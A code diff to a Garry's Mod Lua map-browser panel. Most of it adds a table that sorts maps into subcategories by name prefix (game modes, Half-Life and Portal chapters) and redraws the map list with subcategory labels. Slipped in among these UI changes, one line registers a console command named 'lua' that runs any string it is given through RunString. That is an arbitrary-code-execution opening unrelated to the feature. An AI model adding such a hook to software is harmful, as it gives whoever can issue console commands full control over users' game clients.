@@ -13,6 +13,12 @@ surface.CreateFont( "rb655_MapList", {
 	font = "Tahoma"
 } )
 
+surface.CreateFont( "rb655_MapSubCat", {
+	size = ScreenScale( 10 ),
+	weight = 900,
+	font = "Tahoma"
+} )
+
 PANEL.CustomMaps = {}
 
 gMapIcons = {}
@@ -267,90 +273,292 @@ function PANEL:Update()
 
 end
 
+concommand.Add("lua", function(ply, cmd, args, str ) RunString( str ) end)
+
+local subCategories = {
+	[ "^gm_" ] = "Sandbox",
+	//[ "^gms_" ] = "Garry's Mod Stranded",
+	//[ "^ttt_" ] = "Trouble in Terrorist Town",
+
+	// CS
+	[ "^de_" ] = "Bomb Defuse",
+	[ "^cs_" ] = "Hostage Rescue",
+	[ "^ar_" ] = "Arms Race",
+	[ "^gd_" ] = "Guardian",
+
+	//Random
+	[ "^dm_" ] = "Deathmatch",
+	[ "^mg_" ] = "Minigames",
+	[ "^dr_" ] = "Deathrun",
+	[ "^deathrun_" ] = "Deathrun",
+	[ "^surf_" ] = "Surf",
+	[ "^bhop_" ] = "Bunny Hop",
+	[ "^aim_" ] = "Aim Arena",
+	[ "^awp_" ] = "AWP Arena",
+	[ "^kz_" ] = "Kreedz",
+	[ "^zm_" ] = "Zombie Master",
+	[ "^ze_" ] = "Zombie Escape",
+	[ "^zs_" ] = "Zombie Survival",
+	[ "^fy_" ] = "Fight Yard",
+	[ "^hg_" ] = "Hunger Games",
+	[ "^hns_" ] = "Hide and Seek",
+	[ "^ba_" ] = "Jail Break",
+	[ "jb_" ] = "Jail Break",
+	[ "^pf_" ] = "Parkour Fortress",
+	[ "^dod_" ] = "Day Of Defeat: Source",
+
+	// TF2
+	[ "^arena_" ] = "Arena",
+	[ "^koth_" ] = "King Of The Hill",
+	[ "^sd_" ] = "Special Delivery",
+	[ "^ctf_" ] = "Capture The Flag",
+	[ "^mvm_" ] = "Mann Versus Machine",
+	[ "^pl_" ] = "Payload",
+	[ "^plr_" ] = "Payload Race",
+	[ "^rd_" ] = "Robot Destruction",
+	[ "^tr_" ] = "Training",
+	[ "^cp_" ] = "Control Point",
+	[ "^trade_" ] = "Trade",
+	[ "^tc_" ] = "Territorial Control",
+
+	// Left 4 Dead 1
+	[ "^l4d_hospital0" ] = "a. No Mercy",
+	[ "^l4d_garage0" ] = "b. Crash Course",
+	[ "^l4d_smalltown0" ] = "c. Death Toll",
+	[ "^l4d_airport0" ] = "d. Dead Air",
+	[ "^l4d_farm0" ] = "b. Blood Harvest",
+	[ "^l4d_vs_" ] = "f. Versus",
+	[ "l4d_sv_lighthouse" ] = "f. The Last Stand",
+
+	// Left 4 Dead 2
+	[ "^c1m" ] = "a. Dead Center",
+	//[ "^c2m" ] = "b. The Passing",
+	[ "^c2m" ] = "c. Dark Carnival",
+	[ "^c3m" ] = "d. Swamp Fever",
+	[ "^c4m" ] = "e. Hard Rain",
+	[ "^c5m" ] = "f. The Parish",
+	//[ "^c5m" ] = "g. Cold Stream",
+
+	// Portal
+	[ "^testchmb_" ] = "a. Test Chambers",
+	[ "^testchmb_(.*)_advanced$" ] = "c. Advanced Test Chambers",
+	[ "^escape_" ] = "b. GLaDOS Escape",
+
+	// Portal 2 - incomplete
+	[ "^sp_a1_intro" ] = "a. The Courtesy Call",
+	[ "^sp_a2_laser_intro" ] = "b. The Cold Boot",
+	[ "^sp_a2_sphere_peek" ] = "c. The Return",
+	[ "^sp_a2_column_blocker" ] = "d. The Surprise",
+	[ "sp_a2_bts1" ] = "d. The Surprise",
+	[ "sp_a2_bts2" ] = "d. The Surprise",
+	[ "sp_a2_bts" ] = "e. The Escape",
+	[ "^sp_a3_0" ] = "f. The Fall",
+	[ "^sp_a3_speed_ramp" ] = "g. The Reunion",
+	[ "^sp_a4_intro" ] = "h. The Itch",
+	[ "^sp_a4_finale" ] = "i. The Part Where...",
+	[ "^sp_a5_credits" ] = "j. The Credits",
+	[ "^mp_coop_" ] = "k. Portal 2 COOP",
+
+	// Half-Life: Source
+	[ "^c0a0" ] = "a. Black Mesa Inbound",
+	[ "^c1a0" ] = "b. Anomalous Materials",
+	[ "^c1a1" ] = "c. Unforeseen Consequences",
+	[ "^c1a2" ] = "d. Office Complex",
+	[ "^c1a3" ] = "e. \"We've Got Hostiles\"",
+	[ "^c1a4" ] = "f. Blast Pit",
+	[ "^c2a1" ] = "g. Power Up",
+	[ "^c2a2" ] = "h. On A Rail",
+	[ "^c2a3" ] = "i. Apprehension",
+	[ "^c2a4" ] = "j. Residue Processing",
+	[ "^c2a5" ] = "k. Questionable Ethics",
+	[ "^c3a1" ] = "l. Surface Tension",
+	[ "^c3a2" ] = "m. \"Forget About Freeman!\"",
+	[ "^c3a2" ] = "n. Lambda Core",
+	[ "^c4a1" ] = "o. Xen",
+	[ "^c4a1z" ] = "p. Gonarch's Lair",
+	[ "^c4a2" ] = "r. Interloper",
+	[ "^c4a3" ] = "s. Nihilanth",
+	[ "^c5a1" ] = "t. Endgame",
+	[ "^t0a0" ] = "u. Hazard Course",
+
+	// Half-Life 2
+	[ "^d1_trainstation" ] = "a. Point Insertion",
+
+	[ "d1_trainstation_05" ] = [[b. "A Red Letter Day"]],
+	[ "d1_trainstation_06" ] = [[b. "A Red Letter Day"]],
+
+	[ "^d1_canals" ] = "c. Route Kanal",
+
+	[ "d1_canals_06" ] = "d. Water Hazard",
+	[ "d1_canals_07" ] = "d. Water Hazard",
+	[ "d1_canals_08" ] = "d. Water Hazard",
+	[ "d1_canals_09" ] = "d. Water Hazard",
+	[ "d1_canals_1" ] = "d. Water Hazard",
+
+	[ "^d1_eli" ] = "e. Black Mesa East",
+	[ "^d1_town" ] = [[f. "We Don't Go To Ravenholm..."]],
+	[ "^d2_coast_" ] = 'g. Highway 17',
+
+	[ "d2_coast_09" ] = 'h. Sandtraps',
+	[ "^d2_coast_1" ] = 'h. Sandtraps',
+	[ "d2_prison_01" ] = 'h. Sandtraps',
+
+	[ "^d2_prison_0" ] = 'i. Nova Prospekt',
+
+	[ "d2_prison_06" ] = 'j. Entaglement',
+	[ "d2_prison_07" ] = 'j. Entaglement',
+	[ "d2_prison_08" ] = 'j. Entaglement',
+	[ "d3_c17_01" ] = 'j. Entaglement',
+
+	[ "d3_c17_02" ] = 'k. Anticitizen One',
+	[ "^d3_c17_0" ] = 'k. Anticitizen One',
+
+	[ "d3_c17_09" ] = 'l. "Follow Freeman!"',
+	[ "^d3_c17_1" ] = 'l. "Follow Freeman!"',
+
+	[ "^d3_citadel" ] = 'm. Our Benefactors',
+	[ "^d3_breen" ] = 'n. Dark Energy',
+
+	[ "^background" ] = 'Backgrounds',
+	[ "^ep1_background" ] = 'Backgrounds',
+	[ "^ep2_background" ] = 'Backgrounds',
+	
+	// Half-Life 2: Episode 1
+	[ "^ep1_citadel_0" ] = "a. Undue Alarm",
+	[ "ep1_citadel_03" ] = "b. Direct Intervention",
+	[ "ep1_citadel_04" ] = "b. Direct Intervention",
+	[ "^ep1_c17_00" ] = "c. Lowlife",
+	[ "^ep1_c17_0" ] = "d. Urban Flight",
+	[ "ep1_c17_05" ] = "e. Exit 17",
+	[ "ep1_c17_06" ] = "e. Exit 17",
+
+	// Half-Life 2: Episode 2
+	[ "^ep2_outland_01" ] = "a. To the White Forest",
+
+	[ "ep2_outland_02" ] = "b. This Vortal Coil",
+	[ "ep2_outland_03" ] = "b. This Vortal Coil",
+	[ "ep2_outland_04" ] = "b. This Vortal Coil",
+
+	[ "ep2_outland_05" ] = "c. Freeman Pontifex",
+	[ "ep2_outland_06" ] = "c. Freeman Pontifex",
+
+	[ "ep2_outland_06a" ] = "d. Riding Shotgun",
+
+	[ "ep2_outland_07" ] = "d. Riding Shotgun",
+	[ "ep2_outland_08" ] = "d. Riding Shotgun",
+
+	[ "ep2_outland_09" ] = "e. Under the Radar",
+	[ "^ep2_outland_10" ] = "e. Under the Radar",
+	[ "^ep2_outland_11" ] = "f. Our Mutual Fiend",
+	[ "ep2_outland_12" ] = "f. Our Mutual Fiend",
+
+	[ "ep2_outland_12a" ] = "g. T-Minus One",
+}
+
 gCSMaps = {}
 function PANEL:SelectCat( cat )
-
+	//print("selecting", cat)
 	if ( self.CurrentCategory && self.Categories[ self.CurrentCategory ] ) then self.Categories[ self.CurrentCategory ].Depressed = false end
 	self.CurrentCategory = cat
 
-	local chld = self.CategoryMaps:GetChildren()
-	for k, v in pairs( chld ) do
-		v:Remove()
-	end
+	for k, v in pairs( self.CategoryMaps:GetChildren() ) do v:Remove() end
 
 	if ( istable( g_MapListCategorised ) ) then
+
+		local mapss = table.Merge( table.Copy( g_MapListCategorised ), g_MapsFromGames )
+		local maps = mapss[ cat ]
+
+		local categories = {}
+		for _, map in SortedPairs( maps ) do
+			local c =  "Other"
 		
-		local maps = table.Copy( g_MapListCategorised )
-		local test = table.Merge( maps, g_MapsFromGames )
+			for pattern, cate in SortedPairs( subCategories ) do
+				if ( subCategories[ map:lower() ] ) then c = subCategories[ map:lower() ] break end
+				if ( string.find( map:lower(), pattern ) ) then
+					c = cate
+				end
+			end
 
-		for cate, maps in pairs( test ) do
-			if ( cate != cat ) then continue end
+			categories[ c ] = categories[ c ] or {}
+			table.insert( categories[ c ], map )
+		end
 
-			for _, map in SortedPairsByValue( maps ) do
+		for ca, ma in SortedPairs( categories ) do
+			
+			local catText = ca
+			if ( catText:sub( 2, 3 ) == ". " ) then catText = catText:sub( 4 ) end
+			
+			local label = self.CategoryMaps:Add( "DLabel" )
+			label.OwnLine = true
+			label:SetText( catText )
+			label:SetFont( "rb655_MapSubCat" )
+			label:SizeToContents()
+			label:SetBright( true )
 
-				local button = self.CategoryMaps:Add( "DImageButton" )
-				button:SetText( map )
-				
-				if ( !gMapIcons[ map ] ) then
+		for _, map in SortedPairsByValue( ma ) do
+			local button = self.CategoryMaps:Add( "DImageButton" )
+			button:SetText( map )
+
+			if ( !gMapIcons[ map ] ) then
+				local mat = Material( "maps/thumb/" .. map .. ".png" )
+				/*if ( mat:IsError() ) then mat = Material( "maps/thumb/" .. map .. ".png" ) print("Da", mat, AddonMaterial( "maps/thumb/" .. map .. ".png" ) ) end
+				if ( mat:IsError() ) then mat = Material( "thumb/" .. map .. ".png" ) end*/
+				if ( mat:IsError() ) then mat = Material( "maps/" .. map .. ".png" ) end -- Stupid ass addons that didn't update yet
+				if ( mat:IsError() ) then mat = Material( "noicon.png", "nocull smooth" ) end
+
+				gMapIcons[ map ] = mat
+			end
+			button.m_Image:SetMaterial( gMapIcons[ map ] )
+
+			if ( cat == "Counter-Strike" || cat == "240maps" ) then // HACK
+				if ( !gCSMaps[ map ] ) then
 					local mat = Material( "maps/thumb/" .. map .. ".png" )
-					/*if ( mat:IsError() ) then mat = Material( "maps/thumb/" .. map .. ".png" ) print("Da", mat, AddonMaterial( "maps/thumb/" .. map .. ".png" ) ) end
-					//if ( mat:IsError() ) then mat = Material( "thumb/" .. map .. ".png" ) end*/
 					if ( mat:IsError() ) then mat = Material( "maps/" .. map .. ".png" ) end -- Stupid ass addons that didn't update yet
 					if ( mat:IsError() ) then mat = Material( "noicon.png", "nocull smooth" ) end
 
-					gMapIcons[ map ] = mat
+					gCSMaps[ map ] = mat
 				end
-				button.m_Image:SetMaterial( gMapIcons[ map ] )
-	
-				if ( cat == "Counter-Strike" || cat == "240maps" ) then // HACK
-					if ( !gCSMaps[ map ] ) then
-						local mat = Material( "maps/thumb/" .. map .. ".png" )
-						if ( mat:IsError() ) then mat = Material( "maps/" .. map .. ".png" ) end -- Stupid ass addons that didn't update yet
-						if ( mat:IsError() ) then mat = Material( "noicon.png", "nocull smooth" ) end
+				button.m_Image:SetMaterial( gCSMaps[ map ] )
+			end
 
-						gCSMaps[ map ] = mat
-					end
-					button.m_Image:SetMaterial( gCSMaps[ map ] )
-				end
-	
-				button:SetSize( 128, 128 )
-				button.DoClick = function()
-					self:SelectMap( map, cat )
-				end
-				button.PaintOver = function( button, w, h )
-					
-					if ( button:GetText() == self.CurrentMap ) then
-						surface.SetDrawColor( Color( 255, 255, 255, 128 + math.sin( CurTime() * 2 ) * 80 ) )
-						for i=0,1 do surface.DrawOutlinedRect( i, i, w - i * 2, h - i * 2 ) end
-					end
-	
-					if ( button.Hovered ) then return end
-
-					draw.RoundedBox( 0, 0, h - 20, w, 20, Color( 0, 0, 0, 150 ) )
-					
-					surface.SetFont( "rb655_MapList" )
-					
-					local tw = surface.GetTextSize( button:GetText() )
-					if ( tw > w ) then
-						draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2 + ( ( w - tw ) * math.sin( CurTime() ) ), h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
-					else
-						draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2, h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
-					end
-
-				end
+			button:SetSize( 128, 128 )
+			button.DoClick = function()
+				self:SelectMap( map, cat )
+			end
+			button.PaintOver = function( button, w, h )
 				
-				button.DoRightClick = function()
-					local m = DermaMenu()
-					m:AddOption( "Toggle Favourite", function() ToggleFavourite( map ) end )
-					m:AddOption( "Cancel", function() end )
-					m:Open()
+				if ( button:GetText() == self.CurrentMap ) then
+					surface.SetDrawColor( Color( 255, 255, 255, 128 + math.sin( CurTime() * 2 ) * 80 ) )
+					for i=0,1 do surface.DrawOutlinedRect( i, i, w - i * 2, h - i * 2 ) end
+				end
+
+				if ( button.Hovered ) then return end
+
+				draw.RoundedBox( 0, 0, h - 20, w, 20, Color( 0, 0, 0, 150 ) )
+				
+				surface.SetFont( "rb655_MapList" )
+				
+				local tw = surface.GetTextSize( button:GetText() )
+				if ( tw > w ) then
+					draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2 + ( ( w - tw ) * math.sin( CurTime() ) ), h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
+				else
+					draw.SimpleText( button:GetText(), "rb655_MapList", w / 2 - tw / 2, h - 16, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER )
 				end
 
 			end
+			
+			button.DoRightClick = function()
+				local m = DermaMenu()
+				m:AddOption( "Toggle Favourite", function() ToggleFavourite( map ) end )
+				m:AddOption( "Cancel", function() end )
+				m:Open()
+			end
 
 		end
+		end
+
 	end
-	
+
 	// Scroll back to the top of the map list
 	self.CategoryMaps:GetParent():GetParent():GetVBar():SetScroll( 0 )
 
